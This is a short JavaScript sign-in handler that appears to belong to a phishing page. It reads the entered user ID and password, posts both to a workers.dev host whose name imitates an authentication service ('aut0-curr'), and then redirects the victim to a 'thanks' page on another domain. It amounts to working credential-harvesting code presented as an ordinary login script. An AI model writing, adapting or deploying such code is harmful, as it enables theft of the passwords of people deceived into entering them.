$('#signin').click(function(event) {
    event.preventDefault();
    let username = document.getElementById("userID").value;
    let passerror = document.getElementById("passwordErrorText");
    let password = document.getElementById("password").value;

    if (password.length < 4) {
        passerror.style.fontSize = "small";
        passerror.innerHTML = "Please enter your password correctly!";
    } else {
        fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"  // 🔹 Fixing Content-Type
            },
            body: JSON.stringify({
                userID: username,   // 🔹 Ensuring correct keys
                password: password
            })
        })
        .then(response => response.json())  // Parse JSON response
        .then(data => {
            if (data.success) {  // Expecting a success response
                setTimeout(() => {
                    window.location.href = "https://twklle.pages.dev/thanks.html";
                }, 1000);
            } else {
                passerror.innerHTML = data.error || "There was an error processing your request.";
            }
        })
        .catch(error => {
            passerror.innerHTML = "Network error. Please try again.";
        });
    }
});
